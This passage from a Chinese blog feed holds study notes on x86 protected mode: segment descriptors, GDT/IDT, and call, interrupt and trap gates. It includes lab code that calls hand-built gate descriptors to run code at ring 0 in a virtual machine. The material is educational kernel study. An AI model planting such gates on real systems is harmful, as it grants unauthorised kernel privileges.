class=""><p>向下扩展可以认为是原段长限制取反的结果。其余位就不做过多演示了，第一章讲的还是比较清楚哒。</p><h2 id="门描述符实验"><a href="#门描述符实验" class="headerlink" title="门描述符实验"></a>门描述符实验</h2><h3 id="调用门"><a href="#调用门" class="headerlink" title="调用门"></a>调用门</h3><p>调用门是存在 gdt 当中的，属于系统段，这里直接构建一个可以跨段提权的调用门，先设好参数。</p><ul><li>调用门跳转地址为 0x401000（关闭随机地址的第一个函数的地址）。</li><li>TYPE设为0xC，表明是调用门。</li><li>目标段选择子设为，0x8，这是一个 0 环的段选择子。</li><li>P DPL S&#x3D;1110&#x3D;0xE，P&#x3D;1表示段有效，DPL&#x3D;3表示请求的最低权限为 3 环，S&#x3D;0表明是系统段。</li><li>ParamCount 设为 0。</li></ul><p>据此构造的段描述符为 0040EC00&#96;00081000，写到 gdtr+0x48 的位置，直接去调用，因为我们提了零环权限，所以可以直接读取 gdt 表项。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line">__int64 gdt_item;</span><br><span class="line"><span class="type">void</span> __declspec(naked)<span class="built_in">test</span>()&#123;</span><br><span class="line">__asm&#123;</span><br><span class="line">mov ebx,<span class="number">0x80B93800</span>;<span class="comment">//gdtr的值</span></span><br><span class="line">lea eax,[ebx<span class="number">+0x38</span>];</span><br><span class="line">mov eax,[eax];</span><br><span class="line">mov dword ptr[gdt_item],eax;</span><br><span class="line">lea eax,[ebx<span class="number">+0x38</span><span class="number">+4</span>];</span><br><span class="line">mov eax,[eax]</span><br><span class="line">mov dword ptr[gdt_item<span class="number">+4</span>],eax;</span><br><span class="line">retf;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;test=%p\n&quot;</span>,test);</span><br><span class="line"><span class="type">char</span> bufcode[<span class="number">6</span>]=&#123;<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x4b</span>,<span class="number">0x00</span>&#125;;</span><br><span class="line">__asm&#123;</span><br><span class="line">nop;</span><br><span class="line">call fword ptr bufcode;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;gdt_item=%llx\n&quot;</span>,gdt_item);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 运行之后我们拿到当前线程的 fs 段描述符的值。</p><img src="/2024/10/08/x86_3/12.png" class=""><p>运行之后拿到了值 7f40f3fd&#96;f0000fff，通过拆解，我们可以得到当前线程的 FS 段基址为 0x7ffdf000，段限长为 0xFFF。</p><p>由于该虚拟机在调用门函数内中断会直接死机，就不这么玩了，接下来我们看看传参。</p><hr><p>构造两个参数的调用门，对应描述符为 0040EC02&#96;00081000。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> arg1,arg2;</span><br><span class="line"><span class="type">void</span> __declspec(naked)<span class="built_in">test</span>(<span class="type">int</span> a1,<span class="type">int</span> a2)&#123;</span><br><span class="line">__asm&#123;</span><br><span class="line"><span class="type">int</span> <span class="number">3</span>;</span><br><span class="line">mov eax,[a1];</span><br><span class="line">mov [arg1],eax;</span><br><span class="line">mov eax,[a2];</span><br><span class="line">mov [arg2],eax;</span><br><span class="line">retf <span class="number">8</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;test=%p\n&quot;</span>,test);</span><br><span class="line"><span class="type">char</span> bufcode[<span class="number">6</span>]=&#123;<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x4b</span>,<span class="number">0x00</span>&#125;;</span><br><span class="line">__asm&#123;</span><br><span class="line">nop;</span><br><span class="line">push <span class="number">0x12345678</span>;</span><br><span class="line">push <span class="number">0x61626364</span>;</span><br><span class="line">call fword ptr bufcode;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>,arg1,arg2);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改，运行之后可以在内核调试器中中断下来。</p><img src="/2024/10/08/x86_3/13.png" class=""><p>同时我们可以观察到内核中栈的情况，从栈顶到栈底依次是。</p><ul><li>EIP</li><li>CS</li><li>第一个参数（最后被压入的才是第一个参数）</li><li>第二个参数</li><li>ESP</li><li>SS</li></ul><h3 id="中断门"><a href="#中断门" class="headerlink" title="中断门"></a>中断门</h3><p>这里需要换一个表了，去寻找 IDT 表。</p><img src="/2024/10/08/x86_3/14.png" class=""><p>可以发现 +0x100 的位置是空的中断描述符，于是也新建一个中断门描述符，几乎与调用门描述符是一致的。填充一个 3 环可以请求，请求之后 CS 为 08 的中断描述符，0040EE00&#96;00081000。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> __declspec(naked)<span class="built_in">test</span>()&#123;</span><br><span class="line">__asm&#123;</span><br><span class="line"><span class="type">int</span> <span class="number">3</span>;</span><br><span class="line">iret;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;test=%p\n&quot;</span>,test);</span><br><span class="line">__asm&#123;</span><br><span class="line">nop;</span><br><span class="line"><span class="type">int</span> <span class="number">0x20</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样中断下来看看栈。</p><img src="/2024/10/08/x86_3/15.png" class=""><p>不难发现栈的情况从栈顶到栈底依次是</p><ul><li>EIP</li><li>CS</li><li>EFLAGS</li><li>ESP</li><li>SS</li></ul><p>同时值得注意的是，IF 位被置为 0，在调用门中，IF 是没有被置零的，中断返回使用的是 iret 指令，它会把中断重新打开。倘若在此使用 retf 4 将 EFLAGS 视为参数平衡栈，看似没有问题也能正确长返回。</p><img src="/2024/10/08/x86_3/16.png" class=""><p>此时返回可以发现，EFLAGS 的 IF 位没有被恢复，如果此时执行一个之前未执行过的函数，会因为缺页产生异常，将该函数代码的页面调入页内，如果此时 EFLAGS 的 IF 位是置 0 的，那么就会直接蓝屏。</p><p>复现一遍蓝屏</p><img src="/2024/10/08/x86_3/17.png" class=""><p>可以发现中断在了 kitrap0e 函数中，这是 0e 中断的处理函数，0e 就是页错误的中断号</p><hr><p>Okay，前两章的理论+实验完美完成，也学到了不少东西。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1].<a href="https://www.52pojie.cn/thread-1795079-1-1.html">https://www.52pojie.cn/thread-1795079-1-1.html</a></li></ul>]]></content>
    
    
    <summary type="html">通过做实验来加深一下印象</summary>
    
    
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/Windows/"/>
    
    <category term="Kernel" scheme="https://xia0ji233.github.io/categories/Windows/Kernel/"/>
    
    <category term="X86" scheme="https://xia0ji233.github.io/categories/X86/"/>
    
    <category term="Protected_Mode" scheme="https://xia0ji233.github.io/categories/X86/Protected-Mode/"/>
    
    
    <category term="Windows" scheme="https://xia0ji233.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>x86的保护模式（2）——调用门，中断门，陷阱门与门描述符</title>
    <link href="https://xia0ji233.github.io/2024/10/05/x86_2/"/>
    <id>https://xia0ji233.github.io/2024/10/05/x86_2/</id>
    <published>2024-10-05T06:00:00.000Z</published>
    <updated>2024-10-05T06:46:27.783Z</updated>
    
    <content type="html"><![CDATA[<p>今天开始学习各种门与门描述符</p><span id="more"></span><p>先解决一下上节课的存疑。</p><h2 id="段选择子的检验"><a href="#段选择子的检验" class="headerlink" title="段选择子的检验"></a>段选择子的检验</h2><p>尝试将段选择子装入 CS 或 SS 时，会进行检查，通常会产生一个保护异常。而装入其它的段寄存器不会立即检查，会在尝试访问的时候检查权限。</p><hr><p>前面提到，段描述符当 <code>s=0</code> 时，是一个系统段，而系统段根据 TYPE 域的变化有如下的区别</p><img src="/2024/10/05/x86_2/1.png" class=""><p>其中就有各种各样的门描述符，包括调用门、中断门、陷阱门，门描述符的结构如下所示</p><img src="/2024/10/05/x86_2/2.png" class=""><h2 id="长调用和短调用，长跳转与短跳转"><a href="#长调用和短调用，长跳转与短跳转" class="headerlink" title="长调用和短调用，长跳转与短跳转"></a>长调用和短调用，长跳转与短跳转</h2><p>在学习调用门之前，先来了解一下长跳（jmp far），短跳（jmp）与长调用（call far），短调用（call）的区别。我们平时使用的比较多的指令其实都是短调用和短跳转，几乎很少用到长跳和长调用。长调用和长跳事实上会修改段寄存器 CS，CS不能通过一般的赋值指令修改，只能通过长调用或长跳修改。</p><p><strong>长跳不会改变进程 CPL，长调用会</strong>。</p><p>短跳：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jmp 立即数/寄存器/内存</span><br><span class="line">//仅修改 EIP</span><br></pre></td></tr></table></figure><p>长跳：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jmp far cs:eip</span><br><span class="line">//修改 EIP 和 CS</span><br></pre></td></tr></table></figure><p>事实上，长调用在现实情况中也很少见。</p><p>短调用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">call cs:eip</span><br><span class="line">//修改 esp，eip和内存</span><br></pre></td></tr></table></figure><p>长调用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">call far cs:eip （eip参数在这里不发挥作用）</span><br><span class="line">//修改 esp eip cs和内存，返回使用 retf</span><br></pre></td></tr></table></figure><h3 id="跨段不提权"><a href="#跨段不提权" class="headerlink" title="跨段不提权"></a>跨段不提权</h3><p>这里编写代码测试一下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="type">int</span> __declspec(naked)<span class="built_in">func</span>() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        retf;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, func);</span><br><span class="line">    <span class="type">char</span> bufcode[] = &#123; <span class="number">0x00</span>,<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>,<span class="number">0x00</span> &#125;;</span><br><span class="line">    *(<span class="type">int32_t</span>*)&amp;bufcode[<span class="number">0</span>] = (<span class="type">int32_t</span>)func;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        nop;</span><br><span class="line">        call fword ptr bufcode;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下断点调试，进入之后可以发现在执行 call 的时候不但压入了 EIP，同时将段寄存器 CS 也压入栈中。</p><img src="/2024/10/05/x86_2/3.png" class=""><p>在 retf 之后，同样会将 EIP 和 CS 一块弹出来，恢复栈。</p><h3 id="跨段提权"><a href="#跨段提权" class="headerlink" title="跨段提权"></a>跨段提权</h3><p>通常是改变了进程自身的权限，至于前面提到了跨段之后提权，自然是会有一些校验的。对于用户层来说，我们跨段提权仅仅是修改 CS 和 EIP。如果我们修改了 CS 提权，同时能够任意指定 EIP，那将会产生很严重的安全漏洞。</p><p>因此，跨段调用提权需要通过调用门来进行，我们看到调用门描述符结构</p><img src="/2024/10/05/x86_2/2.png" class=""><ul><li>ParamCount 有五位，可以指定该调用门最多拥有31个参数。</li><li>TYPE&#x3D;C 表明是调用门。</li><li>P&#x3D;1表示有效。</li><li>S&#x3D;0表示为系统段。</li><li>DPL指示了该调用门需要请求的权限。</li><li>调用门还存储了新的段选择子指示该调用门调用之后 CS 新的值。</li><li>其余 32 位数据指示了新的 EIP 的位置。</li></ul><p>因此我们说跨段提权的情况中，EIP 被废弃，我们只需要指示 CS 为目标调用门即可，而目的地址则在对应的门描述符中，因此我们通过调用门来进行跨段提权无法指示目标代码的执行位置（至少在用户层）。</p><h2 id="调用门"><a href="#调用门" class="headerlink" title="调用门"></a>调用门</h2><h3 id="跨段提权具体过程"><a href="#跨段提权具体过程" class="headerlink" title="跨段提权具体过程"></a>跨段提权具体过程</h3><p>对于一致代码段而言，低级别的程序可以在不通过提升 CPL 的情况下访问。对于非一致代码段而言，禁止不同级别进行访问，要想访问则必须通过调用门先提升 CPL 再调用。</p><p>从上面分析我们可以总结调用门的执行过程（个人理解，难免有误，敬请指正），在调用 call far 的时候会进行如下操作：</p><ol><li>根据 CALL 给出的 CS 在 GDT 中找到对应的对描述符，CPU验证该段描述符是一个调用门描述符。</li><li>检查 CPL 与调用门 DPL 是否满足调用条件</li><li>将 SS 和 ESP 压栈。</li><li>取出调用门当中指定的新段选择子，给CS，当前 CS，EIP 压栈。</li><li>SS 会变为当前 CS+8 的值，此时栈会被切换。</li><li>栈切换之前，会根据 ParamCount 字段获取原栈中参数个数，并将它压入新的栈中。</li><li>将调用前的 CS，EIP也压入新的栈中。</li><li>根据 CS 新的段选择子的 Base + 调用门指定的 Offset 将 EIP 设置到指定的位置。</li></ol><p>这样就完成了跨段提权的过程。</p><h3 id="调用门权限检查"><a href="#调用门权限检查" class="headerlink" title="调用门权限检查"></a>调用门权限检查</h3><p>它会检查这几个字段</p><ul><li>CPL</li><li>门选择子 RPL（也就是你尝试 CALL 的所指定的门选择子的低2位）</li><li>调用门描述符 DPL</li><li>目标代码段 DPL</li></ul><p>同时还要检查目标代码段的一致性位。</p><p>与前面访问数据差不多，CALL 调用门权限要满足以下条件：</p><ul><li>CPL&lt;&#x3D;调用门DPL</li><li>RPL&lt;&#x3D;调用门DPL</li><li>目标代码段DPL&lt;&#x3D;CPL。</li></ul><p>这里会发现有点奇怪，为什么 CPL &gt;&#x3D; 目标代码段 DPL，这是为了防止通过调用门以高特权级去执行用户代码。也就是说，使用 <code>call far</code> 尝试调用调用门时，只允许向高特权级的代码去转移而不能向低特权级的代码转移。相对应的，<code>call far</code> 有对应的 <code>retf</code> 指令与之对应，但是 <code>retf</code> 只能向同权限或者低权限去转移。</p><p>对于 JMP 来说，除了满足前两个条件外，如果目标是非一致代码段，则不允许低权限的 CPL 进来访问，只允许同级访问，因为 <code>jmp far</code> 不会改变当前进程的 CPL。对于一致代码段，访问并不会受限，此时也不会改变当前进程的特权级。</p><p><code>retf</code> 指令它能确保跨段提权之后，恢复所有栈的情况，包括提权之后可能压入的 CS，EIP，SS，ESP以及参数的清理等。</p><h2 id="中断门与陷阱门"><a href="#中断门与陷阱门" class="headerlink" title="中断门与陷阱门"></a>中断门与陷阱门</h2><h3 id="中断"><a href="#中断" class="headerlink" title="中断"></a>中断</h3><p>中断（Interrupt）指的是当出现需要的时候，CPU放弃处理当前运行的程序转而去处理的过程。比如常见的除零（0号中断），断点（3号中断），系统调用（0x2e中断，Linux使用0x80中断）以及异常处理都会引发中断，调用相应的处理例程去处理中断事件。而操作系统需要维护这样的一个例程表，于是就有了 IDT。</p><p>中断门与调用门类似，也会指定新的段选择子和一个中断处理程序，所以中断门也可以用于提权，提权的规则与检测与调用门几乎相同，在某些细节有略微的差异。</p><h3 id="中断描述符表"><a href="#中断描述符表" class="headerlink" title="中断描述符表"></a>中断描述符表</h3><p>与gdt一样，同样有一个寄存器 IDTR 维护了一张中断描述符表（IDT），同样，该寄存器是 48 位的寄存器，存储了 IDT 表的位置（4字节）和大小（2字节），IDT的长度字段默认是 0x7FF，也就是IDT总长为 2048 字节，能够存入 256 个中断描述符。</p><p>IDT 主要存储三种门描述符</p><ul><li>任务门描述符</li><li>中断门描述符</li><li>陷阱门描述符</li></ul><p>中断描述符结构如下图所示</p><img src="/2024/10/05/x86_2/4.png" class=""><p>其中，TYPE 域的 D 位决定了它是 16 位（0）还是 32 位（1）的中断门。除了 ParamCount 字段，其余字段跟调用门几乎是一致的。</p><p>IDT可以存入以下三种描述符：</p><ol><li><strong>任务门描述符</strong>：用于任务切换，里面包含用于选择任务状态段（TSS）的段选择子。可以使用JMP或CALL指令通过任务门来切换到任务门所指向的任务，当CPU因为中断或异常转移到任务门时，也会切换到指定任务。</li><li><strong>中断门描述符</strong>：用于描述中断例程的入口。</li><li><strong>陷阱门描述符</strong>：用于描述异常处理例程的入口。</li></ol><h3 id="中断门调用过程"><a href="#中断门调用过程" class="headerlink" title="中断门调用过程"></a>中断门调用过程</h3><p>通过中断门进入处理程序有很多种方法，通过 <code>int xx</code> 指令进入应该属于熟知的方式，除此之外，以下行为均会通过中断门进入中断处理过程：</p><ul><li>int 指令</li><li>外部设备中断</li><li>软件异常</li></ul><p>同样，如果是跨段提权，那么需要进行栈切换，保存原 CS 等等操作，除此之外，需要额外保留原来的 EFLAGS，栈的情况如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">|   SS   |   &lt;- 用户模式的栈段选择子</span><br><span class="line">|  ESP   |   &lt;- 用户模式的栈指针</span><br><span class="line">| EFLAGS |   &lt;- 标志寄存器</span><br><span class="line">|   CS   |   &lt;- 代码段选择子</span><br><span class="line">|   EIP  |   &lt;- 被中断的指令地址</span><br></pre></td></tr></table></figure><p>对应的，从中断处理程序返回使用 <code>iret</code> 指令返回到被中断的位置。<code>iret</code> 指令和 <code>retf</code> 一样，</p><p>可以完美地还原压栈的参数。</p><p>这里需要注意的是，<code>iret</code> 指令并不单单还原栈的参数，还会做一件事情，就是开中断。因为通过中断门调用进去之后，会屏蔽其它中断（ <code>eflags.TF=0</code>）。如果仅仅使用 <code>retf 4</code> 进行长返回的话，会导致应用层程序的 <code>eflags.TF=0</code>，如果此时它出现其它异常，会导致无法中断这个程序从而出现蓝屏。并且，<code>eflags.TF</code> 标志位无法在用户层修改，只能通过特权指令 <code>cli</code>（关中断）和 <code>sti</code>（开中断）去修改。</p><p>关中断指令只能屏蔽可屏蔽中断，电源掉电等不可屏蔽中断（NMI）CPU无法屏蔽,其它硬件也可以向CPU报告紧急事件，通过CPU的NMI引脚去触发，CPU一旦收到必须立刻处理。</p><h3 id="陷入"><a href="#陷入" class="headerlink" title="陷入"></a>陷入</h3><p>与中断几乎一样，唯一的区别是陷阱门调用之后不会关中断，也就是说它可以被其它中断打断。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1].<a href="http://www.qfrost.com/posts/windowskernel/windows%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_2">http://www.qfrost.com/posts/windowskernel/windows保护模式学习笔记_2</a></li><li>[2].<a href="https://www.cnblogs.com/onetrainee/p/12436327.html">https://www.cnblogs.com/onetrainee/p/12436327.html</a></li></ul>]]></content>
    
    
    <summary type="html">今天开始学习各种门与门描述符</summary>
    
    
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/Windows/"/>
    
    <category term="Kernel" scheme="https://xia0ji233.github.io/categories/Windows/Kernel/"/>
    
    <category term="X86" scheme="https://xia0ji233.github.io/categories/X86/"/>
    
    <category term="Protected_Mode" scheme="https://xia0ji233.github.io/categories/X86/Protected-Mode/"/>
    
    
    <category term="Windows" scheme="https://xia0ji233.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>x86的保护模式（1）——段描述符与段寄存器</title>
    <link href="https://xia0ji233.github.io/2024/09/17/x86_1/"/>
    <id>https://xia0ji233.github.io/2024/09/17/x86_1/</id>
    <published>2024-09-17T09:00:00.000Z</published>
    <updated>2024-10-06T06:06:44.367Z</updated>
    
    <content type="html"><![CDATA[<p>重新把内核基础学一遍，方便后续学习的展开。</p><span id="more"></span><p>x86 是一个非常经典的复杂指令集架构（CISC），它的特点是指令不定长，解析指令时会根据头个字节甚至是第二个字节决定指令解析的长度，作为本篇学习的研究例子。</p><p>x86 的 CPU 在早期都是以<strong>实模式</strong>运行的，在 80386 及以后，x86 CPU 新增了分页的虚拟内存机制，同时在 80286 CPU 中就新增了其它运行模式，比如<strong>保护模式</strong>，本篇将重点学习<strong>保护模式</strong>。</p><h2 id="保护模式"><a href="#保护模式" class="headerlink" title="保护模式"></a>保护模式</h2><h3 id="CPU分级"><a href="#CPU分级" class="headerlink" title="CPU分级"></a>CPU分级</h3><p>只需要知道，数值上越小，权限越大。就像你的Linux root的 uid 就是0。CPU设计的时候是分了四级 ring 环，如图所示：</p><img src="/2024/09/17/x86_1/1.png" class=""><p>最外层是 ring3，是我们平时程序运行的等级，只能执行少数的非特权指令。ring0 是操作系统或者是驱动运行的等级，分级的目的就是防止应用程序随意篡改内核数据。内核数据的不正确修改往往会导致操作系统无法继续运行，Linux上会直接 crash 并强制关机，Windows 会蓝屏。</p><p>在CPU设计的时候，将 ring2 和 ring1给了驱动程序去运行，然而实际情况是，大部分操作系统没有使用 ring1 和 ring2，只使用了 ring0 和 ring3。所以在编写驱动的时候，驱动程序通常是直接运行在和操作系统同一等级 ring0 的。</p><h3 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h3><p>要理解保护模式，首先就得介绍一下段寄存器。</p><p>段寄存器主要有：CS，DS，SS，ES，FS，GS等等。最开始的实模式中，段寄存器的作用是做一个基址保存，因为当时 8086 的总线宽度为 20 位，寻址能力 1MB（2的20次方），但是寄存器却只有16位。于是 Intel 这么设计：16 位的段寄存器中的值 * 16 再加真实的 16 位寻址地址，得到了访问的真实地址，但是其中会有 12 位是重叠的。</p><ul><li>代码段寄存器CS与寄存器IP相配合获得当前线程代码执行到的内存位置；</li><li>数据段寄存器DS与各通用寄存器配合访问内存中的数据；</li><li>栈段寄存器SS与寄存器(E)SP、(E)BP配合访问线程的调用栈（call stack）；</li><li>扩展段寄存器ES用于特定字符串指令（如MOVS或CMPS）。</li></ul><p>随着技术的发展，段寄存器已经不是最初那个仅用来保存基址的寄存器了，但是它对用户来看，仍然是 16 位的寄存器。它的含义也有了很大的变化，分段，不仅要规定内存起始地址，目标长度，还有对应的操作权限，仅凭16位的段寄存器看起来是远远不够的（由于需要兼容早期版本的机器，段寄存器一直被设计为16位）。于是，属于我们用户层的段寄存器，就仅保存<strong>段选择子</strong>，其余信息保存在<strong>段描述符</strong>中。段描述符可以被存储在任何内存的位置，但是通常来说它在<strong>内核空间</strong>。</p><h3 id="GDT和LDT表"><a href="#GDT和LDT表" class="headerlink" title="GDT和LDT表"></a>GDT和LDT表</h3><p>上面提到了，段描述符是存储在内核空间的，内核空间负责维护了一张表，叫全局描述符表（GDT，Global Descriptor Table）。为了找到这张表，Intel 专门设计了一个寄存器 GDTR（Global Descriptor Table Register）来存储这张表的位置。</p><p>使用 LGDT 指令可以对 GDTR 寄存器做修改，当然，这也是特权指令，用户态无法直接调用。</p><p>除了 GDT，还允许程序员自行构建局部描述符表（LDT，Local Descriptor Table），它可以为每个进程构建一张段描述符表，另外，每一个LDT自身<strong>作为一个段</strong>存在，它们的段描述符被放在GDT中。LDT只是一个可选的数据结构，完全可以不用它，完全取决与操作系统的开发者意愿。实际上目前主流的 OS（Windows、Linux）中，很少出现 LDT 的身影，因为它们自身实现了很完整的分页管理机制，LDT 的实现可能的确对于内存管理有所方便，但还是和目前主流的 OS 设计观念不太相符（本人主观猜测）。</p><h3 id="段选择子-段描述符"><a href="#段选择子-段描述符" class="headerlink" title="段选择子&amp;段描述符"></a>段选择子&amp;段描述符</h3><p>前面提到了，段寄存器对于用户来说仅保存<strong>段选择子</strong>，通过<strong>段选择子</strong>所指示的信息可以找到对应的<strong>段描述符</strong>。先来看看段选择子的一个<strong>结构图</strong>：</p><img src="/2024/09/17/x86_1/2.png" class=""><p>最低的两位指示了CPU的请求特权等级（RPL，Request Privilege Level），猜测这里刚好对应 CPU 的四个环。</p><p>最低的第三位指示了该段的<strong>段描述符</strong>是查找 LDT 还是查找 GDT，如果为 0 表示查找 GDT。</p><p>其余指示了<strong>段描述符</strong>在 GDT 或者 LDT 的索引。</p><hr><p>段描述符的结构如图所示（以32位为例）：</p><img src="/2024/09/17/x86_1/3.png" class=""><p>它的成员有很多，一个一个来介绍：</p><ul><li><p>P位：段描述符是否有效</p></li><li><p>Base：被分成了三个部分，Base 的低16位被放置在低 4 个字节的前两个字节。高 16 位分别被分到了高四个字节的首尾字节。</p></li><li><p>Limit：段限长，可以发现只有 <code>16+4=20</code> 位，范围在 <code>1B~1MB</code>，但是它还有个 G 位，可以保证32位程序的段限长到 4GB。</p></li><li><p>G位：是否以页为单位。如果 <code>G=1</code>，那么段限长以页（4KB）为单位，否则以字节（B）为单位。这样就保证了，段限长最大可以达到 $2^{20}\times4\text{KB}&#x3D;4\text{GB}$。</p></li><li><p>S位：描述符是否为<strong>代码或数据</strong>段描述符。如果 <code>S=1</code>，则为代码或数据段描述符，否则为<strong>系统</strong>段描述符。</p></li><li><p>TYPE域：有四位的大小，比较复杂，根据 S 位具有不同的含义，在下面展开讲。</p></li></ul><p>当 <code>S=1</code> 时，为<strong>代码或者数据段描述符</strong>，具体如下图所示：</p><img src="/2024/09/17/x86_1/4.png" class=""><p>最高位显然是区分是否为代码段的，若为 1 则是<strong>代码段</strong>，其余还有五个位需要介绍。</p><ol><li>A：访问位，判断该段是否被访问过</li><li>E：向下扩展位，向下扩展表示段基址开始到段限长范围内的内存都可以访问，向上扩展则刚好相反，段基址到段限长之间的内存不能访问，其余可以访问。</li><li>R：可读位，表示是否可读。</li><li>W：可写位，表示是否可写（默认可读）。</li><li>C：一致位，后面将介绍一致位。</li></ol><p>如下图展示了向下扩展位和向上扩展位的区别，绿色块表示可访问，红色块表示不可访问。</p><img src="/2024/09/17/x86_1/5.png" class=""><p>当 <code>S=0</code> 时，为<strong>系统段描述符</strong>，TYPE域的具体如下所示：</p><img src="/2024/09/17/x86_1/6.png" class=""><p>下面接着讲段描述符相关的成员。。</p><ul><li>D&#x2F;B位：可以简单的理解为是 16 